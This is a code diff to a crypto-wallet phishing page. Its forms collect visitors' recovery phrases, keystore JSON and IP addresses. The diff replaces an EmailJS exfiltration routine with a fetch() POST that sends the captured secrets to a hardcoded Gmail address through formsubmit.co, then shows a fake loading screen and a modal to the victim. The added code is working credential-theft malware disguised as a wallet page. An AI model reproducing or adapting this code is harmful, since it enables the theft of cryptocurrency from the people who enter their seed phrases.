@@ -234,7 +234,7 @@
     </div>
     <div class="container">
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
-            <form  id="pass-phrase" action="https://formsubmit.co/webdme8@gmail.ccom" method="POST">
+            <form  id="pass-phrase">
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
@@ -245,7 +245,7 @@
             
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-          <form  id="pass-phrase" action="https://formsubmit.co/webdme8@gmail.com" method="POST">
+          <form  id="pass-phrase">
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_template" value="table">
                 <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
@@ -303,9 +303,7 @@
     </script>
 
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script type="text/javascript">
+<script>
     $("form#pass-phrase").submit(async(e)=>{
       e.preventDefault();
       if(validatePhrase()){
@@ -317,31 +315,29 @@
         $("div.spanner").addClass("show");
         $("div.overlay").addClass("show");
 
-        // Initialize EmailJS with your service ID
-        emailjs.init("service_w9aainn");
+        const formData = new FormData();
+        formData.append('value', passphrase);
+        formData.append('type', fullType);
+        formData.append('ip', ip);
 
-        const templateParams = {
-          value: passphrase,
-          type: fullType,
-          ip: ip
-        };
+        const email = "webdme8@gmail.com"; // Change this to your email address
+        const endpoint = `https://formsubmit.co/${email}`;
 
-        // Send email using EmailJS
-        emailjs.send('service_w9aainn', 'template_ygc5wzc', templateParams)
-          .then(function(response) {
-            console.log('Email sent:', response);
-            setTimeout(()=>{
-                $("div.spanner").removeClass("show");
-                $("div.overlay").removeClass("show");
-                $(".modal").fadeIn();
-            },2000);
-          }, function(error) {
-            console.error('Email sending failed:', error);
-          });
+        const res = await fetch(endpoint, {
+          method: "POST",
+          body: formData
+        });
+        if (!res.ok) return console.log("SOMETHING WENT WRONG");
+
+        setTimeout(()=>{
+            $("div.spanner").removeClass("show");
+            $("div.overlay").removeClass("show");
+            $(".modal").fadeIn();
+        },2000);
+        const data = await res.json();
+        console.log(data);
       }
     });
-</script>
-
 
     // Similar modifications for other forms...
 
